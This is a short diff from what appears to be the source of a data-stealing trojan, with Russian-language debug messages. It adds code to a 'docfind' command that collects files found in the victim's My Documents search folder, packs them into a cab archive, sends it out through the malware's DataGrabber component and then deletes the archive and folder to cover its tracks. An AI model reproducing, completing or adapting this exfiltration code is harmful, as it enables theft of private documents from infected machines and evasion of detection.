@@ -764,10 +764,23 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
 				if( func )
 				{
+					TASKDBG( "Task", "Выполняется команда docfind" );
 					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
 					func( 0, DLL_PROCESS_ATTACH, 0 );
 					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
 					pCloseHandle(hEvent);
+					char path[MAX_PATH], tmpName[MAX_PATH];
+					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
+					pPathAppendA( path, "search" );
+					TASKDBG( "Task", "Поиск файлов завершен, отправляем папку %s", path );
+					File::GetTempName(tmpName);
+					HCAB cab = CreateCab(tmpName);
+					AddDirToCab( cab, path, "docfind" );
+					CloseCab(cab);
+					TASKDBG( "Task", "сформирован cab файл %s", tmpName );
+					DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
+					pDeleteFileA(tmpName);
+					Directory::Delete(path);
 				}
 			}
 			MemoryFreeLibrary(module);
